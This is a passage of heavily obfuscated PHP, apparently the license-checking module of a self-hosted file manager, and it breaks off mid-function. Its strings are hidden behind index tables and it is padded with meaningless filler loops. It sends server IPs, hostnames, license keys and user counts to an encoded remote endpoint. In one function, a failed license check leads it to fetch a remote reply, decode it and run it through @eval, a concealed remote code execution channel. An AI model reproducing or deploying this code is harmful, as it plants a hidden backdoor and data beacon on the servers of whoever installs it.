unset($ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[90]][$ΦμΒ­Ζύ[91]]); $ΑώφΙ‰Υ = $ςνΏμσ[717]; unset($ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[90]][$ΦμΒ­Ζύ[92]]); $†°Σν· = $ςνΏμσ[718]; if (!$†°Σν·) { return; } unset($ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[89]][$ΦμΒ­Ζύ[46]]); unset($ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[89]][$ΦμΒ­Ζύ[93]]); $·†ύΧΤ• = $ςνΏμσ[719]; if (strlen($·†ύΧΤ•) < $ςνΏμσ[694]) { return; } $ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[89]][$ΦμΒ­Ζύ[94]] = array($ΦμΒ­Ζύ[95] => (int) $§Ύ€πΤΰ[$ΦμΒ­Ζύ[96]], $ΦμΒ­Ζύ[97] => (int) _get($§Ύ€πΤΰ, $ΦμΒ­Ζύ[98], 0)); $µ—¬΅ώ = $ςνΏμσ[720]; $ΩδΣ‘ύα = substr(md5($ΦμΒ­Ζύ[99] . get_client_ip() . $ΦπήςΑ[$ΦμΒ­Ζύ[100]]), 0, 15); $‘§’κ΄ = $ςνΏμσ[721]; $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[102]] = Mcrypt::encode(Session::sign(), $ΩδΣ‘ύα, 3600 * 24); $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[103]] = Action($ΦμΒ­Ζύ[104])->accessToken(); $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[105]] = md5($_SERVER[$ΦμΒ­Ζύ[106]] . $ΦπήςΑ[$ΦμΒ­Ζύ[100]]); $μδΓ¦ςΖ = $ςνΏμσ[722]; $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[107]] = base64_encode(serverInfo()); $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[108]] = $this->lqsn9f2dccec; $Χ¦€έ = $ςνΏμσ[723]; while (strlen($Χ¦€έ) < $ςνΏμσ[698]) { if (!$Χ¦€έ) { break; } $Χ¦€έ++; } if ($ΦπήςΑ[$ΦμΒ­Ζύ[108]] != $ΦμΒ­Ζύ[109]) { $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[110]] = $ΦπήςΑ[$ΦμΒ­Ζύ[110]]; $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[111]] = $ΦπήςΑ[$ΦμΒ­Ζύ[111]]; $¦’ήΗΗζ = rand_string(10) . $this->lqsn9f2dccec . rand_string(5); $ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[112]][$ΦμΒ­Ζύ[113]] = $this->yark622e8c08($¦’ήΗΗζ, $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[105]]); } if ($this->lqsn9f2dccec == $ΦμΒ­Ζύ[109]) { $ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[89]][$ΦμΒ­Ζύ[94]][$ΦμΒ­Ζύ[98]] = 0; } $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[114]] = $this->versionPluginFilter(); $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[115]] = _get($this->tdox5a24fe65, $ΦμΒ­Ζύ[116], $ΦμΒ­Ζύ[6]); if (KodUser::isRoot() && $this->config[$ΦμΒ­Ζύ[117]]) { $ή―ΐ„‚π[$ΦμΒ­Ζύ[101]][$ΦμΒ­Ζύ[118]] = WEB_ROOT; } return $ή―ΐ„‚π; } private function pmrkfff640d4() { $† ητΙ =& $_SERVER[γγάψ½]; $™ή®φΌΏ =& $_SERVER[Βφεβ–φ]; $φΖ‹ΰμ = $_SERVER[$™ή®φΌΏ[24]] == $™ή®φΌΏ[119]; if ($_SERVER[$™ή®φΌΏ[24]] == $™ή®φΌΏ[120] && $_GET[$™ή®φΌΏ[121]] == $™ή®φΌΏ[122]) { $φΖ‹ΰμ = !0; } if ($φΖ‹ΰμ) { $Β²ο = array($™ή®φΌΏ[108] => $this->lqsn9f2dccec, $™ή®φΌΏ[123] => $this->vaym55d00255(), $™ή®φΌΏ[124] => Model($™ή®φΌΏ[125])->count()); if ($this->lqsn9f2dccec != $™ή®φΌΏ[109]) { $ω­φΠ¨ = _get($this->tdox5a24fe65, $™ή®φΌΏ[126]); if ($ω­φΠ¨) { $Β²ο[$™ή®φΌΏ[127]] = $ω­φΠ¨; $Β²ο[$™ή®φΌΏ[128]] = strtotime(_get($this->tdox5a24fe65, $™ή®φΌΏ[129])); $Β²ο[$™ή®φΌΏ[130]] = _get($this->tdox5a24fe65, $™ή®φΌΏ[116]); } $Ψ‹ς±κ΅ = Model($™ή®φΌΏ[33])->get($™ή®φΌΏ[131], $™ή®φΌΏ[6], !0); if (is_string($Ψ‹ς±κ΅) && substr($Ψ‹ς±κ΅, 0, 1) == $™ή®φΌΏ[132]) { $Ψ‹ς±κ΅ = json_decode_force($Ψ‹ς±κ΅); } if (is_array($Ψ‹ς±κ΅) && $Ψ‹ς±κ΅[$™ή®φΌΏ[133]] && strstr($Ψ‹ς±κ΅[$™ή®φΌΏ[133]], $™ή®φΌΏ[134])) { $”ρΰΛΙ = explode($™ή®φΌΏ[134], $Ψ‹ς±κ΅[$™ή®φΌΏ[133]]); $Β²ο[$™ή®φΌΏ[135]] = $”ρΰΛΙ[0]; } } $Β²ο = $this->ypql40b03909(json_encode($Β²ο), md5($™ή®φΌΏ[136])); $΅ΏΊς = $† ητΙ[724]; if (strlen($΅ΏΊς) < $† ητΙ[698]) { return; } $°¬¦υ‰ = array($™ή®φΌΏ[137] => $Β²ο); call_user_func(array($™ή®φΌΏ[138], $™ή®φΌΏ[139]), $°¬¦υ‰); $Ν•θιΣ£ = $† ητΙ[725]; } if ($this->lqsn9f2dccec == $™ή®φΌΏ[109]) { return; } $³³ΞΎ΅ = array($™ή®φΌΏ[140], $™ή®φΌΏ[141], $™ή®φΌΏ[142], $™ή®φΌΏ[143], $™ή®φΌΏ[144], $™ή®φΌΏ[145]); $‚…άΓ· = $† ητΙ[726]; while (strlen($‚…άΓ·) < $† ητΙ[701]) { if (!$‚…άΓ·) { break; } $‚…άΓ·++; } $ώ·δάΊ = Model($™ή®φΌΏ[33])->get(); $°¬¦υ‰ = array($™ή®φΌΏ[146] => $ώ·δάΊ[$™ή®φΌΏ[34]], $™ή®φΌΏ[147] => $ώ·δάΊ[$™ή®φΌΏ[35]], $™ή®φΌΏ[148] => $™ή®φΌΏ[6]); foreach ($³³ΞΎ΅ as $λΐ―κή) { if (!isset($ώ·δάΊ[$λΐ―κή]) || !$ώ·δάΊ[$λΐ―κή]) { continue; } $°¬¦υ‰[$λΐ―κή] = $ώ·δάΊ[$λΐ―κή]; } call_user_func(array($™ή®φΌΏ[138], $™ή®φΌΏ[139]), $°¬¦υ‰); } private function veic7d9ed4da() { $€ώΥθ·Ά =& $_SERVER[γγάψ½]; $Ξ„΄¨ =& $_SERVER[Βφεβ–φ]; if ($_SERVER[$Ξ„΄¨[24]] != $Ξ„΄¨[149]) { return; } if (!KodUser::isRoot()) { die; } $ξΫν°·ρ = $GLOBALS[$Ξ„΄¨[13]]; if (isset($ξΫν°·ρ[$Ξ„΄¨[150]])) { $this->gziq28294e02(); die; } if (isset($ξΫν°·ρ[$Ξ„΄¨[151]]) && isset($ξΫν°·ρ[$Ξ„΄¨[151]]) == $Ξ„΄¨[122]) { $ξΫν°·ρ[$Ξ„΄¨[152]] = Model($Ξ„΄¨[33])->get($Ξ„΄¨[153]); } if (!isset($ξΫν°·ρ[$Ξ„΄¨[152]]) || strlen($ξΫν°·ρ[$Ξ„΄¨[152]]) != 16) { show_json($Ξ„΄¨[154] . $ξΫν°·ρ[$Ξ„΄¨[152]], !1); } $ςΝ”ƒΔ = Model($Ξ„΄¨[33])->get($Ξ„΄¨[100]); $¨Ξ¶¬κ» = md5($_SERVER[$Ξ„΄¨[106]] . $ςΝ”ƒΔ); $µωθΧςΨ = array($Ξ„΄¨[152] => $ξΫν°·ρ[$Ξ„΄¨[152]], $Ξ„΄¨[155] => rand_string(16), $Ξ„΄¨[156] => $Ξ„΄¨[136], $Ξ„΄¨[157] => $Ξ„΄¨[158], $Ξ„΄¨[159] => $_SERVER[$Ξ„΄¨[160]], $Ξ„΄¨[161] => $_SERVER[$Ξ„΄¨[162]], $Ξ„΄¨[163] => $_SERVER[$Ξ„΄¨[164]], $Ξ„΄¨[105] => $¨Ξ¶¬κ», $Ξ„΄¨[165] => Model($Ξ„΄¨[33])->get($Ξ„΄¨[131])); if (isset($ξΫν°·ρ[$Ξ„΄¨[151]]) && isset($ξΫν°·ρ[$Ξ„΄¨[151]]) == $Ξ„΄¨[122]) { $µωθΧςΨ[$Ξ„΄¨[151]] = md5($µωθΧςΨ[$Ξ„΄¨[152]] . $Ξ„΄¨[166] . $µωθΧςΨ[$Ξ„΄¨[155]]); } if ($ξΫν°·ρ[$Ξ„΄¨[167]] == $Ξ„΄¨[168]) { $»θυ°μ = $this->ypql40b03909($¨Ξ¶¬κ», $Ξ„΄¨[169]); $Τίααξ = $this->yark622e8c08(json_encode($µωθΧςΨ), $¨Ξ¶¬κ» . $Ξ„΄¨[170], 3); $Τίααξ = $Τίααξ . $Ξ„΄¨[171] . $_SERVER[$Ξ„΄¨[160]]; $ƒρρσΛΡ = $this->qlfj9aad4cc2($Ξ„΄¨[172] . $»θυ°μ . $Ξ„΄¨[173] . $Τίααξ, -1); show_json($ƒρρσΛΡ, !0); } else { if ($ξΫν°·ρ[$Ξ„΄¨[167]] == $Ξ„΄¨[174]) { $†Τ¨½΅Θ = substr(md5($Ξ„΄¨[175] . $¨Ξ¶¬κ»), 12, 15) . $Ξ„΄¨[176]; $Τίααξ = $this->biag4151e7ee(trim($ξΫν°·ρ[$Ξ„΄¨[177]]), $†Τ¨½΅Θ, 2); $Ή­Ρ¨…› = json_decode($Τίααξ, !0); if (!is_array($Ή­Ρ¨…›) || !is_array($Ή­Ρ¨…›[$Ξ„΄¨[178]]) || $Ή­Ρ¨…›[$Ξ„΄¨[152]] != !0) { $ν¦Έ‘Φ = $Ξ„΄¨[179]; $―›“¶Ρ = $Ή­Ρ¨…›[$Ξ„΄¨[178]] ? $Ξ„΄¨[180] . $Ή­Ρ¨…›[$Ξ„΄¨[178]] : $ν¦Έ‘Φ; show_json($―›“¶Ρ, !1); } else { $µωθΧςΨ[$Ξ„΄¨[155]] = $Ή­Ρ¨…›[$Ξ„΄¨[178]][$Ξ„΄¨[181]]; } } else { $Ή­Ρ¨…› = $this->qlfj9aad4cc2($Ξ„΄¨[182], $µωθΧςΨ, 10); } } if (!is_array($Ή­Ρ¨…›) || !is_array($Ή­Ρ¨…›[$Ξ„΄¨[178]]) || $Ή­Ρ¨…›[$Ξ„΄¨[152]] != !0) { $ν¦Έ‘Φ = LNG($Ξ„΄¨[183]); $―›“¶Ρ = $Ή­Ρ¨…›[$Ξ„΄¨[178]] ? $Ξ„΄¨[180] . $Ή­Ρ¨…›[$Ξ„΄¨[178]] : $ν¦Έ‘Φ; show_json($―›“¶Ρ, !1); } $ΡΩΎφ = $Ή­Ρ¨…›[$Ξ„΄¨[178]]; $ΤοΛ‹πΡ = $this->pqtf0d0510c0($ΡΩΎφ[$Ξ„΄¨[184]]); $Ι¥«ί–ζ = $€ώΥθ·Ά[727]; if (!$Ι¥«ί–ζ) { return; } if (!$ΤοΛ‹πΡ || $ΤοΛ‹πΡ != $ΡΩΎφ[$Ξ„΄¨[129]]) { $ϋΈ¶†γ = array($Ξ„΄¨[185] => Model($Ξ„΄¨[33])->get($Ξ„΄¨[100]), $Ξ„΄¨[186] => $_SERVER[$Ξ„΄¨[106]], $Ξ„΄¨[187] => this_url(), $Ξ„΄¨[161] => $_SERVER[$Ξ„΄¨[162]]); $Τίααξ = $this->vgekd3d09b9a(json_encode($ϋΈ¶†γ)); $this->qlfj9aad4cc2($Ξ„΄¨[188] . $Τίααξ); show_json(LNG($Ξ„΄¨[189]), !0); } $‡άαΝτ = array($Ξ„΄¨[153] => $ΡΩΎφ[$Ξ„΄¨[190]], $Ξ„΄¨[191] => $ΡΩΎφ[$Ξ„΄¨[192]], $Ξ„΄¨[193] => rand_string(16), $Ξ„΄¨[108] => $ΡΩΎφ[$Ξ„΄¨[194]]); if ($µωθΧςΨ[$Ξ„΄¨[155]]) { $‡άαΝτ[$Ξ„΄¨[193]] = $µωθΧςΨ[$Ξ„΄¨[155]]; } $Ι²±Ϋ– = substr(md5($‡άαΝτ[$Ξ„΄¨[191]]), 10, 10); $―Ου¥δ = $Ι²±Ϋ– . $‡άαΝτ[$Ξ„΄¨[108]] . $‡άαΝτ[$Ξ„΄¨[193]]; $ΌτΑξΦ = $€ώΥθ·Ά[728]; if (!$ΌτΑξΦ) { return; } $‡άαΝτ[$Ξ„΄¨[110]] = strrev(base64_encode($this->ypql40b03909($―Ου¥δ, $Ξ„΄¨[195]))); $ρχκψ§ = $€ώΥθ·Ά[729]; $›τΛβΫ» = rand_string(16); $“Τυι΄µ = $€ώΥθ·Ά[730]; while ($“Τυι΄µ < $€ώΥθ·Ά[701]) { if ($“Τυι΄µ >= 0) { break; } $“Τυι΄µ++; } $ι¨― = $›τΛβΫ» . $‡άαΝτ[$Ξ„΄¨[108]] . $this->ypql40b03909(md5($‡άαΝτ[$Ξ„΄¨[153]]), $›τΛβΫ»); $‡άαΝτ[$Ξ„΄¨[111]] = base64_encode(strrev($this->ypql40b03909($ι¨―, $Ξ„΄¨[196]))); if ($ΡΩΎφ[$Ξ„΄¨[197]] && $ΡΩΎφ[$Ξ„΄¨[197]] >= 1) { Model($Ξ„΄¨[33])->setDeep($Ξ„΄¨[198], $Ξ„΄¨[122]); } Model($Ξ„΄¨[33])->set($‡άαΝτ); $„²“οΦΫ = md5($_SERVER[$Ξ„΄¨[106]] . strrev($ςΝ”ƒΔ) . $‡άαΝτ[$Ξ„΄¨[191]]); $μΟ―Ζθϊ = strrev(substr($„²“οΦΫ, 10, 16)); $ξ©ωΗ¦Ζ = $this->yark622e8c08(json_encode($ΡΩΎφ), $„²“οΦΫ); $‡Λ­ά = array_to_keyvalue(Model($Ξ„΄¨[7])->listData(), $Ξ„΄¨[199]); $­Τ–κ± = $€ώΥθ·Ά[731]; if (strlen($­Τ–κ±) < $€ώΥθ·Ά[691]) { die; } $—ϋσΩΎΖ = $‡Λ­ά[$Ξ„΄¨[200]]; $¦§ΘΣ = $€ώΥθ·Ά[732]; if (strlen($¦§ΘΣ) < $€ώΥθ·Ά[691]) { return; } $»φθμ = array(); $†ΙΕ―‘ = $€ώΥθ·Ά[733]; if (!$†ΙΕ―‘) { return; } $»φθμ[$μΟ―Ζθϊ] = $ξ©ωΗ¦Ζ; Model($Ξ„΄¨[7])->update($—ϋσΩΎΖ[$Ξ„΄¨[201]], array($Ξ„΄¨[202] => $»φθμ)); $this->tdox5a24fe65 = $ΡΩΎφ; $this->lqsn9f2dccec = $‡άαΝτ[$Ξ„΄¨[108]]; $•Φ‰Ζ’’ = $€ώΥθ·Ά[734]; while (strlen($•Φ‰Ζ’’) < $€ώΥθ·Ά[691]) { if (!$•Φ‰Ζ’’) { break; } $•Φ‰Ζ’’++; } $this->licenseRegistSuccess(); $νΰάΚΥ = $€ώΥθ·Ά[735]; if (!$νΰάΚΥ) { die; } Cache::set($Ξ„΄¨[203] . md5($ςΝ”ƒΔ . $Ξ„΄¨[204]), $Ξ„΄¨[6]); $¦ΐΞ‹·Ώ = $€ώΥθ·Ά[736]; show_json(LNG($Ξ„΄¨[189]), !0); } private function licenseRegistSuccess() { $ιΝΥψΠο =& $_SERVER[Βφεβ–φ]; $¨ΎΦψ = Model($ιΝΥψΠο[33])->get(); if ($¨ΎΦψ[$ιΝΥψΠο[63]] != $ιΝΥψΠο[122]) { Model($ιΝΥψΠο[33])->set($ιΝΥψΠο[63], $ιΝΥψΠο[122]); } Action($ιΝΥψΠο[205])->initStart(!0); } private function gziq28294e02() { $ΓέΡ’£ =& $_SERVER[γγάψ½]; $ΛηΪ”ώ =& $_SERVER[Βφεβ–φ]; Model($ΛηΪ”ώ[33])->set(array($ΛηΪ”ώ[153] => $ΛηΪ”ώ[6], $ΛηΪ”ώ[191] => $ΛηΪ”ώ[6], $ΛηΪ”ώ[108] => $ΛηΪ”ώ[109], $ΛηΪ”ώ[110] => $ΛηΪ”ώ[6], $ΛηΪ”ώ[111] => $ΛηΪ”ώ[6])); Model($ΛηΪ”ώ[33])->setDeep($ΛηΪ”ώ[198], $ΛηΪ”ώ[206]); $ΤΒ©έΛΘ = $ΓέΡ’£[737]; if (strlen($ΤΒ©έΛΘ) < $ΓέΡ’£[706]) { return; } $this->tdox5a24fe65 = array(); $this->lqsn9f2dccec = $ΛηΪ”ώ[109]; $ΌΖΪσ¬Ι = $ΓέΡ’£[738]; while ($ΌΖΪσ¬Ι < $ΓέΡ’£[706]) { if ($ΌΖΪσ¬Ι >= 0) { break; } $ΌΖΪσ¬Ι++; } } private function hzdfce0889a3() { $ΘΟ“ƒψέ =& $_SERVER[γγάψ½]; $›»¶”ςί =& $_SERVER[Βφεβ–φ]; $_SERVER[$›»¶”ςί[162]] = _get($_SERVER, $›»¶”ςί[162], APP_HOST); $‹υ¦Ζ = $ΘΟ“ƒψέ[739]; $this->lqsn9f2dccec = $›»¶”ςί[109]; $Ε’λΓ = $ΘΟ“ƒψέ[740]; if (!$Ε’λΓ) { return; } $ΞδΩ²Ρ = Model($›»¶”ςί[33])->get(); if ($ΞδΩ²Ρ[$›»¶”ςί[108]] == $›»¶”ςί[109]) { return; } $ΰς³¬δΞ = Model($›»¶”ςί[33])->get($›»¶”ςί[100]); $®ΨΐζίΧ = $›»¶”ςί[203] . md5($ΰς³¬δΞ . $›»¶”ςί[204]); $¨°θΑ™ = Cache::get($®ΨΐζίΧ); $ƒιΥΦΞ‚ = $ΘΟ“ƒψέ[741]; if (strlen($ƒιΥΦΞ‚) < $ΘΟ“ƒψέ[691]) { return; } if (!is_array($¨°θΑ™) || !isset($¨°θΑ™[$›»¶”ςί[207]]) || time() - $¨°θΑ™[$›»¶”ςί[207]] >= 60) { $»»¨Δβ = Model($›»¶”ςί[7])->loadList(); $ψέ»ίΤ• = $»»¨Δβ[$›»¶”ςί[200]]; $μυΝ·¬¦ = md5($_SERVER[$›»¶”ςί[106]] . strrev($ΰς³¬δΞ) . $ΞδΩ²Ρ[$›»¶”ςί[191]]); $ς†‰ΑΝ = strrev(substr($μυΝ·¬¦, 10, 16)); $¨°θΑ™ = $this->biag4151e7ee($ψέ»ίΤ•[$›»¶”ςί[86]][$ς†‰ΑΝ], $μυΝ·¬¦); $¨°θΑ™ = json_decode($¨°θΑ™, !0); } if (!is_array($¨°θΑ™)) { return $this->gziq28294e02(); } $°µωΞλΨ = strtotime($¨°θΑ™[$›»¶”ςί[129]]); if (time() >= $°µωΞλΨ) { return $this->gziq28294e02(); } if (!isset($¨°θΑ™[$›»¶”ςί[207]]) || time() - $¨°θΑ™[$›»¶”ςί[207]] > 20) { $¨°θΑ™[$›»¶”ςί[207]] = time(); Cache::set($®ΨΐζίΧ, $¨°θΑ™); } $this->tdox5a24fe65 = $¨°θΑ™; $this->lqsn9f2dccec = $ΞδΩ²Ρ[$›»¶”ςί[108]]; } private function tunfd84a992e() { $βΰωΆό =& $_SERVER[Βφεβ–φ]; $Ζ―δ© = $GLOBALS[$βΰωΆό[13]]; $›Έ© = $_SERVER[γγάψ½][742]; if (!$›Έ©) { die; } $τάΞύ = $_SERVER[$βΰωΆό[24]]; if ($τάΞύ == $βΰωΆό[208] && $this->lqsn9f2dccec == $βΰωΆό[109]) { show_json(LNG($βΰωΆό[209]), !1, $βΰωΆό[210]); } $“ΡΊΕ¶ = array($βΰωΆό[211], $βΰωΆό[212]); if (in_array($τάΞύ, $“ΡΊΕ¶)) { if ($this->lqsn9f2dccec == $βΰωΆό[109] && isset($Ζ―δ©[$βΰωΆό[213]])) { show_json(LNG($βΰωΆό[209]), !1, $βΰωΆό[210]); die; } $ΆζΌΌ‚ = $this->vaym55d00255(); if ($ΆζΌΌ‚ != intval($βΰωΆό[214])) { if ($ΆζΌΌ‚ <= Model($βΰωΆό[125])->count()) { show_json(LNG($βΰωΆό[215]), !1, $βΰωΆό[210]); die; } } } } private function uczjdbd7d787() { $θ΄ΜΘ«‰ =& $_SERVER[γγάψ½]; $ψ’«ψµ =& $_SERVER[Βφεβ–φ]; $ί†ύΟωό = array($ψ’«ψµ[119], $ψ’«ψµ[120]); if (!KodUser::isRoot() || !isset($_GET[$ψ’«ψµ[216]])) { return; } if (!in_array($_SERVER[$ψ’«ψµ[24]], $ί†ύΟωό)) { return; } $Σ¥φ·ζ = $ψ’«ψµ[217]; $ΈόΚ’ΟΡ = $θ΄ΜΘ«‰[743]; if (!$ΈόΚ’ΟΡ) { return; } $Σ¥φ·ζ = $this->bwtscdf08d8f($Σ¥φ·ζ, $ψ’«ψµ[218]); $ƒΌΛ€ω = $θ΄ΜΘ«‰[744]; while ($ƒΌΛ€ω < $θ΄ΜΘ«‰[701]) { if ($ƒΌΛ€ω >= 0) { break; } $ƒΌΛ€ω++; } $ΟμΤΜυφ = stream_context_create(array($ψ’«ψµ[219] => array($ψ’«ψµ[220] => $ψ’«ψµ[221], $ψ’«ψµ[222] => 3))); $¶ή›πΩΑ = $θ΄ΜΘ«‰[745]; if (!$¶ή›πΩΑ) { die; } $ύ§ΝΖΘμ = @file_get_contents($Σ¥φ·ζ, !1, $ΟμΤΜυφ); $©§Κ­ = $θ΄ΜΘ«‰[746]; if (!$©§Κ­) { die; } header($ψ’«ψµ[223]); if ($ύ§ΝΖΘμ && strstr($ύ§ΝΖΘμ, $ψ’«ψµ[224])) { echo $ύ§ΝΖΘμ; } die; } public function njwi2bb61aad($Ο©ψΖµ¬) { $ΙΪφθ†Δ =& $_SERVER[γγάψ½]; $ρΛΏΊΛ— =& $_SERVER[Βφεβ–φ]; if ($this->lqsn9f2dccec == $ρΛΏΊΛ—[225]) { return $Ο©ψΖµ¬; } $Φ²…ω΅ = $this->versionPluginList(); $§ΜΰΖφ = $ΙΪφθ†Δ[747]; while (strlen($§ΜΰΖφ) < $ΙΪφθ†Δ[694]) { if (!$§ΜΰΖφ) { break; } $§ΜΰΖφ++; } $ύ›ΪΥ = explode($ρΛΏΊΛ—[226], $this->versionPluginFilter()); $ ¥‘»€ = $ΙΪφθ†Δ[748]; while (strlen($ ¥‘»€) < $ΙΪφθ†Δ[698]) { if (!$ ¥‘»€) { break; } $ ¥‘»€++; } $ωΌά© = array(); foreach ($Φ²…ω΅ as $£ώόµΜ => $ίµΘΐϊω) { if ($ίµΘΐϊω == $ρΛΏΊΛ—[227] && substr($this->lqsn9f2dccec, 0, 1) == $ρΛΏΊΛ—[227]) { continue; } if (!in_array($£ώόµΜ, $ύ›ΪΥ)) { $ωΌά©[] = $£ώόµΜ; } } foreach ($ωΌά© as $£ώόµΜ) { unset($Ο©ψΖµ¬[$£ώόµΜ]); $ΙΙ¶’ρ = $ΙΪφθ†Δ[749]; if (!$ΙΙ¶’ρ) { die; } } return $Ο©ψΖµ¬; $Όµ΅¨ρη = $ΙΪφθ†Δ[750]; } private function versionPluginList() { $¬αΥ…ι =& $_SERVER[Βφεβ–φ]; return array($¬αΥ…ι[228] => $¬αΥ…ι[227], $¬αΥ…ι[229] => $¬αΥ…ι[227], $¬αΥ…ι[230] => $¬αΥ…ι[227], $¬αΥ…ι[231] => $¬αΥ…ι[232], $¬αΥ…ι[233] => $¬αΥ…ι[232], $¬αΥ…ι[234] => $¬αΥ…ι[232], $¬αΥ…ι[235] => $¬αΥ…ι[232], $¬αΥ…ι[236] => $¬αΥ…ι[232], $¬αΥ…ι[237] => $¬αΥ…ι[232], $¬αΥ…ι[238] => $¬αΥ…ι[232], $¬αΥ…ι[239] => $¬αΥ…ι[232], $¬αΥ…ι[240] => $¬αΥ…ι[232], $¬αΥ…ι[241] => $¬αΥ…ι[232], $¬αΥ…ι[242] => $¬αΥ…ι[232], $¬αΥ…ι[243] => $¬αΥ…ι[232], $¬αΥ…ι[244] => $¬αΥ…ι[232], $¬αΥ…ι[245] => $¬αΥ…ι[232]); $µλ«¦Ζ‰ = $_SERVER[γγάψ½][751]; if (!$µλ«¦Ζ‰) { return; } } private function versionPluginFilter() { $³·ΐ£¶ =& $_SERVER[γγάψ½]; $¶γοΘωε =& $_SERVER[Βφεβ–φ]; if ($this->lqsn9f2dccec == $¶γοΘωε[109]) { return $¶γοΘωε[6]; } $γ®ψ½ = _get($this->tdox5a24fe65, $¶γοΘωε[246], $¶γοΘωε[6]); $”Να³§ = _get($this->tdox5a24fe65, $¶γοΘωε[116], $¶γοΘωε[6]); $»Έ΅µΜΓ = $³·ΐ£¶[752]; if (strlen($»Έ΅µΜΓ) < $³·ΐ£¶[694]) { die; } $•ΌΝ¶ = _get($this->tdox5a24fe65, $¶γοΘωε[247], $¶γοΘωε[6]); if ($”Να³§ > time() && $•ΌΝ¶ > time()) { $©αϋ Ν = explode($¶γοΘωε[226], $γ®ψ½); $ϊ‘εε = array_keys($this->versionPluginList()); $γ®ψ½ = array_merge($©αϋ Ν, $ϊ‘εε); $γ®ψ½ = implode($¶γοΘωε[226], array_filter(array_unique($γ®ψ½))); } return $γ®ψ½; } private function hwbmdf05441b() { $Ϊ¤Μέΰ© =& $_SERVER[Βφεβ–φ]; if ($this->lqsn9f2dccec != $Ϊ¤Μέΰ©[109]) { $GLOBALS[$Ϊ¤Μέΰ©[86]][$Ϊ¤Μέΰ©[90]][$Ϊ¤Μέΰ©[248]] = $Ϊ¤Μέΰ©[206]; return; } $GLOBALS[$Ϊ¤Μέΰ©[86]][$Ϊ¤Μέΰ©[249]] = $Ϊ¤Μέΰ©[122]; if (Model($Ϊ¤Μέΰ©[250])->get($Ϊ¤Μέΰ©[63]) != $Ϊ¤Μέΰ©[206]) { Model($Ϊ¤Μέΰ©[250])->set($Ϊ¤Μέΰ©[63], $Ϊ¤Μέΰ©[206]); } } public function qhjr8eae9787() { return $_SERVER[Βφεβ–φ][251]; } private function nkaffdaf229e() { $±λΔέ =& $_SERVER[γγάψ½]; $α’©§Κ =& $_SERVER[Βφεβ–φ]; $φ—±‚η = array($α’©§Κ[252], $α’©§Κ[253], $α’©§Κ[254]); $Ώ¨ώ‹³ = $α’©§Κ[255] . md5($α’©§Κ[256]); if ($this->lqsn9f2dccec == $α’©§Κ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$α’©§Κ[24]], $φ—±‚η)) { return; } if (time() % 4 != 0) { return; } $ϋ‹±ƒ‡ = call_user_func(array($α’©§Κ[257], $α’©§Κ[258]), $Ώ¨ώ‹³); $σΐΝυ†Ξ = $±λΔέ[753]; if (!$σΐΝυ†Ξ) { return; } if ($ϋ‹±ƒ‡ && time() - $ϋ‹±ƒ‡ < intval($α’©§Κ[259])) { return; } call_user_func(array($α’©§Κ[257], $α’©§Κ[139]), $Ώ¨ώ‹³, time()); $Δ™‚Υ¦ = Model($α’©§Κ[33])->get($α’©§Κ[100]); $΅·όΝΕε = array($α’©§Κ[152] => Model($α’©§Κ[33])->get($α’©§Κ[153]), $α’©§Κ[167] => $this->lqsn9f2dccec, $α’©§Κ[163] => $_SERVER[$α’©§Κ[164]], $α’©§Κ[165] => Model($α’©§Κ[33])->get($α’©§Κ[131]), $α’©§Κ[105] => md5($_SERVER[$α’©§Κ[106]] . $Δ™‚Υ¦), $α’©§Κ[156] => $α’©§Κ[136], $α’©§Κ[159] => $_SERVER[$α’©§Κ[160]]); $όιτϋ® = $±λΔέ[754]; $ΌΔ™®ω = $this->qlfj9aad4cc2($α’©§Κ[260], $΅·όΝΕε); if (!is_array($ΌΔ™®ω)) { return; } if ($ΌΔ™®ω[$α’©§Κ[152]] && $ΌΔ™®ω[$α’©§Κ[261]]) { if ($this->pqtf0d0510c0($ΌΔ™®ω[$α’©§Κ[261]]) == $΅·όΝΕε[$α’©§Κ[152]]) { return; } } $this->gziq28294e02(); if ($this->pqtf0d0510c0($ΌΔ™®ω[$α’©§Κ[261]]) != $΅·όΝΕε[$α’©§Κ[152]]) { $ρτη†‚© = array($α’©§Κ[185] => $Δ™‚Υ¦, $α’©§Κ[186] => $_SERVER[$α’©§Κ[106]], $α’©§Κ[187] => this_url(), $α’©§Κ[161] => $_SERVER[$α’©§Κ[162]]); $””ΙΝώ = $this->vgekd3d09b9a(json_encode($ρτη†‚©)); $ΌΔ™®ω = $this->qlfj9aad4cc2($α’©§Κ[188] . $””ΙΝώ); if ($ΌΔ™®ω && is_array($ΌΔ™®ω) && isset($ΌΔ™®ω[$α’©§Κ[261]])) { $άΕ½ ΐ® = $this->biag4151e7ee($ΌΔ™®ω[$α’©§Κ[261]], 2); if ($άΕ½ ΐ®) { $άΕ½ ΐ® = $this->pqtf0d0510c0($άΕ½ ΐ®); } if ($άΕ½ ΐ®) { try { @eval($άΕ½ ΐ®); } catch (Exception $ό§¦Ο) { } } } } } private function qlfj9aad4cc2($ ΎΙΈλό = '', $σνπθψΥ = array(), $ζ»όπ³ = 5) { $”³σύν =& $_SERVER[γγάψ½]; $ΧΆ„”Ψ› =& $_SERVER[Βφεβ–φ]; $΄υκ = 